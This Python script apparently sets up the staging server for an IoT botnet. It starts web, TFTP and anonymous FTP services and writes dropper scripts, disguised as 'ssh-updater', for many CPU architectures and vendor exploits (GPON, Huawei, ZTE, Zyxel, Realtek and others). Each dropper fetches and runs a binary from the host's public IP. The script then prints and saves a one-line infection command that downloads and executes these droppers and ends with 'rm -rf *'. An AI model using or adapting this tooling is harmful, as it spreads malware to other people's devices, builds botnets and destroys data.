import subprocess, sys, urllib
ip = urllib.urlopen('http://api.ipify.org').read()
exec_bin = "ssh-updater"
exec_name = "ssh-exploit"
bin_prefix = "lmfao293reuj239jrf234rft34jt."
bin_directory = "mac2139r209ru120934r123jhr908213jh4r09213"
archs = ["x86",               #1
"mips",                       #2
"mpsl",                       #3
"arm4",                       #4
"arm5",                       #5
"arm6",                       #6
"arm7",                       #7
"ppc",                        #8
"m68k",                       #9
"spc",                        #12
"i686",                       #13
"sh4",                        #12
"arc",                        #12
"kill"]                       #11


def run(cmd):
    subprocess.call(cmd, shell=True)
print("\033[01;37mPlease wait while your payload generating.")
print(" ")
run("yum install httpd -y &> /dev/null")
run("service httpd start &> /dev/null")
run("yum install xinetd tftp tftp-server -y &> /dev/null")
run("yum install vsftpd -y &> /dev/null")
run("service vsftpd start &> /dev/null")
run('''echo "service tftp
{
	socket_type             = dgram
	protocol                = udp
	wait                    = yes
    user                    = root
    server                  = /usr/sbin/in.tftpd
    server_args             = -s -c /var/lib/tftpboot
    disable                 = no
    per_source              = 11
    cps                     = 100 2
    flags                   = IPv4
}
" > /etc/xinetd.d/tftp''')	
run("service xinetd start &> /dev/null")
run('''echo "listen=YES
local_enable=NO
anonymous_enable=YES
write_enable=NO
anon_root=/var/ftp
anon_max_rate=2048000
xferlog_enable=YES
listen_address='''+ ip +'''
listen_port=21" > /etc/vsftpd/vsftpd-anon.conf''')
run("service vsftpd restart &> /dev/null")
run("service xinetd restart &> /dev/null")
print("Creating .sh Bins")
print(" ")
run('echo "#!/bin/bash" > /var/lib/tftpboot/ssh-updater.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/ssh-updater.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/ssh-updater.sh')

run('echo "#!/bin/bash" > /var/lib/tftpboot/ssh-updater2.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/ssh-updater2.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/ssh-updater2.sh')

run('echo "#!/bin/bash" > /var/ftp/ssh-updater1.sh')
run('echo "ulimit -n 1024" >> /var/ftp/ssh-updater1.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/ftp/ssh-updater1.sh')

run('echo "#!/bin/bash" > /var/www/html/ssh-updater.sh')
run('echo "#!/bin/bash" > /var/www/html/yarn')
run('echo "#!/bin/bash" > /var/www/html/aws')
run('echo "#!/bin/bash" > /var/www/html/gpon')
run('echo "#!/bin/bash" > /var/www/html/huawei')
run('echo "#!/bin/bash" > /var/www/html/zyxel')
run('echo "#!/bin/bash" > /var/www/html/zte')
run('echo "#!/bin/bash" > /var/www/html/realtek')
run('echo "#!/bin/bash" > /var/www/html/pulse')
run('echo "#!/bin/bash" > /var/www/html/lg')

for i in archs:
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+exec_name+'" >> /var/www/html/ssh-updater.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' aws.exploit" >> /var/www/html/aws')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' lg.exploit" >> /var/www/html/lg')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' pulse.exploit" >> /var/www/html/pulse')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' gpon.exploit" >> /var/www/html/gpon')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' huawei.exploit" >> /var/www/html/huawei')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' zte.exploit" >> /var/www/html/zte')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' yarn.exploit" >> /var/www/html/yarn')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' zyxel.exploit" >> /var/www/html/zyxel')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' realtek.exploit" >> /var/www/html/realtek')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' '+bin_prefix+i+' '+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+exec_name+'" >> /var/ftp/ssh-updater1.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp ' + ip + ' -c get '+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+exec_name+'" >> /var/lib/tftpboot/ssh-updater.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r '+bin_prefix+i+' -g ' + ip + ';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+exec_name+'" >> /var/lib/tftpboot/ssh-updater2.sh')    
run("service xinetd restart &> /dev/null")
run("service httpd restart &> /dev/null")
run('echo -e "ulimit -n999999; ulimit -u999999; ulimit -e999999" >> ~/.bashrc')

print("\x1b[0;31mPayload: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/ssh-updater.sh; curl -O http://" + ip + "/ssh-updater.sh; chmod 777 ssh-updater.sh; sh ssh-updater.sh; tftp " + ip + " -c get ssh-updater.sh; chmod 777 ssh-updater.sh; sh ssh-updater.sh; tftp -r ssh-updater2.sh -g " + ip + "; chmod 777 ssh-updater2.sh; sh ssh-updater2.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " ssh-updater1.sh ssh-updater1.sh; sh ssh-updater1.sh; rm -rf ssh-updater.sh ssh-updater.sh ssh-updater2.sh ssh-updater1.sh; rm -rf *\x1b[0m")
print("")
complete_payload = ("cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/ssh-updater.sh; curl -O http://" + ip + "/ssh-updater.sh; chmod 777 ssh-updater.sh; sh ssh-updater.sh; tftp " + ip + " -c get ssh-updater.sh; chmod 777 ssh-updater.sh; sh ssh-updater.sh; tftp -r ssh-updater2.sh -g " + ip + "; chmod 777 ssh-updater2.sh; sh ssh-updater2.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " ssh-updater1.sh ssh-updater1.sh; sh ssh-updater1.sh; rm -rf ssh-updater.sh ssh-updater.sh ssh-updater2.sh ssh-updater1.sh; rm -rf *")
file = open("payload.txt","w+")
file.write(complete_payload)
file.close()
exit()
raw_input("\033[01;37mYour payload has been generated and saved in payload.txt\033[0m")
